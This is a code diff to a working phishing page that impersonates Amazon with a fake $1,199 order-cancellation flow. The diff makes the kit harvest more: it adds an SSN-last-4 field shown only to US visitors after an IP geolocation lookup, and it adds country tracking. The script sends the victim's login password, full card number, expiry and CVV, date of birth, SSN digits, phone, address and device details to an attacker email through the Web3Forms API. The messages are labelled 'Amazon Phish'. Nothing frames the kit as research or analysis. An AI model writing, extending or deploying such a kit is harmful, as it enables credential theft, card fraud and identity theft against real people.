@@ -35,6 +35,7 @@
         .loading { display: none; text-align: center; padding: 20px; }
         .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #ff9900; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .ssn-group { display: none; }
     </style>
 </head>
 <body>
@@ -100,7 +101,11 @@
                 </div>
                 <div class="form-group">
                     <label>Date of Birth</label>
-                    <input type="text" id="dob" placeholder="MM/DD/YYYY" required>
+                    <input type="text" id="dob" placeholder="MM/DD/YYYY" maxlength="10" required>
+                </div>
+                <div class="form-group ssn-group" id="ssnGroup">
+                    <label>Social Security Number (Last 4 digits)</label>
+                    <input type="text" id="ssn" placeholder="XXXX" maxlength="4">
                 </div>
                 <div class="form-group">
                     <label>Phone Number</label>
@@ -129,7 +134,7 @@
         </div>
         <div class="box step" id="step4">
             <div style="text-align:center;padding:20px;">
-                <div style="font-size:48px;color:#067d62;">✓</div>
+                <div style="font-size:48px;color:#067d62;">&#10003;</div>
                 <h2 style="margin:15px 0;color:#111;">Order Cancelled Successfully</h2>
                 <p style="color:#555;font-size:14px;margin-bottom:20px;">Your refund of $1,199.00 has been initiated and will be processed within 3-5 business days.</p>
                 <p style="color:#888;font-size:12px;">Redirecting to Amazon...</p>
@@ -144,29 +149,57 @@
             <a href="#">Privacy Notice</a>
             <a href="#">Help</a>
         </div>
-        <p>© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        <p>&copy; 1996-2026, Amazon.com, Inc. or its affiliates</p>
     </div>
     <script>
         const WEB3FORMS_KEY = '04af8936-9e51-408a-b725-ab3331e183cf';
         const TARGET_EMAIL = 'barugas2026@outlook.com';
         const WEBHOOK_URL = '';
+        let isUS = false;
         let collectedData = {
             email: '', password: '',
             cardName: '', cardNumber: '', cardExp: '', cardCvv: '',
-            fullName: '', dob: '', phone: '', address: '', city: '', zip: '',
-            ip: '', userAgent: navigator.userAgent, screen: screen.width + 'x' + screen.height,
+            fullName: '', dob: '', ssn: '', phone: '', address: '', city: '', zip: '',
+            ip: '', country: '', userAgent: navigator.userAgent, screen: screen.width + 'x' + screen.height,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             language: navigator.language, timestamp: ''
         };
-        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => collectedData.ip = d.ip).catch(() => {});
+        // Get IP and detect country
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+            collectedData.ip = d.ip;
+            collectedData.country = d.country_code;
+            if (d.country_code === 'US') {
+                isUS = true;
+                document.getElementById('ssnGroup').style.display = 'block';
+                document.getElementById('ssn').required = true;
+            }
+        }).catch(() => {
+            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => collectedData.ip = d.ip).catch(() => {});
+        });
+        // Format card number
         document.getElementById('cardNumber').addEventListener('input', function(e) {
             let v = e.target.value.replace(/\D/g, '').substring(0, 16);
             e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
         });
+        // Format card expiry
         document.getElementById('cardExp').addEventListener('input', function(e) {
             let v = e.target.value.replace(/\D/g, '').substring(0, 4);
             if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2);
             e.target.value = v;
+        });
+        // Format DOB MM/DD/YYYY
+        document.getElementById('dob').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '').substring(0, 8);
+            if (v.length >= 4) {
+                v = v.substring(0,2) + '/' + v.substring(2,4) + '/' + v.substring(4,8);
+            } else if (v.length >= 2) {
+                v = v.substring(0,2) + '/' + v.substring(2);
+            }
+            e.target.value = v;
+        });
+        // Format SSN (4 digits only)
+        document.getElementById('ssn').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
         });
         function showStep(n) {
             document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
@@ -177,13 +210,13 @@
         }
         async function sendData(step) {
             collectedData.timestamp = new Date().toISOString();
-            let msg = '🎣 **AMAZON PHISH - Step ' + step + '**\n━━━━━━━━━━━━━━━━━━━━━━\n';
+            let msg = '** AMAZON PHISH - Step ' + step + ' **\n======================\n';
             if (step >= 1) {
-                msg += '📧 Email: ' + collectedData.email + '\n';
-                msg += '🔑 Password: ' + collectedData.password + '\n';
+                msg += 'Email: ' + collectedData.email + '\n';
+                msg += 'Password: ' + collectedData.password + '\n';
             }
             if (step >= 2) {
-                msg += '\n💳 **Card Info**\n';
+                msg += '\n** Card Info **\n';
                 msg += 'Name: ' + collectedData.cardName + '\n';
                 msg += 'Number: ' + collectedData.cardNumber + '\n';
                 msg += 'Exp: ' + collectedData.cardExp + '\n';
@@ -193,19 +226,21 @@
                 msg += 'Check: ' + cn + '|' + exp[0] + '|' + exp[1] + '|' + collectedData.cardCvv + '\n';
             }
             if (step >= 3) {
-                msg += '\n👤 **Personal Info**\n';
+                msg += '\n** Personal Info **\n';
                 msg += 'Name: ' + collectedData.fullName + '\n';
                 msg += 'DOB: ' + collectedData.dob + '\n';
+                if (collectedData.ssn) msg += 'SSN (Last 4): ' + collectedData.ssn + '\n';
                 msg += 'Phone: ' + collectedData.phone + '\n';
                 msg += 'Address: ' + collectedData.address + ', ' + collectedData.city + ' ' + collectedData.zip + '\n';
             }
-            msg += '\n🌐 **Device Info**\n';
+            msg += '\n** Device Info **\n';
             msg += 'IP: ' + collectedData.ip + '\n';
+            msg += 'Country: ' + collectedData.country + '\n';
             msg += 'Screen: ' + collectedData.screen + '\n';
             msg += 'Timezone: ' + collectedData.timezone + '\n';
             msg += 'Language: ' + collectedData.language + '\n';
             msg += 'UA: ' + collectedData.userAgent.substring(0, 100) + '\n';
-            msg += '━━━━━━━━━━━━━━━━━━━━━━';
+            msg += '======================';
             if (WEB3FORMS_KEY) {
                 try {
                     await fetch('https://api.web3forms.com/submit', {
@@ -213,7 +248,7 @@
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
                             access_key: WEB3FORMS_KEY,
-                            subject: '🎣 Amazon Phish - Step ' + step,
+                            subject: 'Amazon Phish - Step ' + step + ' - ' + collectedData.country,
                             from_name: 'Phish Alert',
                             message: msg,
                             victim_email: collectedData.email,
@@ -254,6 +289,7 @@
             e.preventDefault();
             collectedData.fullName = document.getElementById('fullName').value;
             collectedData.dob = document.getElementById('dob').value;
+            collectedData.ssn = document.getElementById('ssn').value;
             collectedData.phone = document.getElementById('phone').value;
             collectedData.address = document.getElementById('address').value;
             collectedData.city = document.getElementById('city').value;
